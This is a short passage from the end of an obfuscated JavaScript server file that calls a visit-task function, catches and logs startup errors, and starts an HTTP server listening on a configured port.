AddVisitTask();}catch(_0x3dd38d){console[_0x17c67a(0x1a6)](_0x17c67a(0x159),_0x3dd38d);}}startserver()['catch'](_0x48ea9f=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x48ea9f);}),app['listen'](PORT,()=>console[_0x4fbc61(0x1ba)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
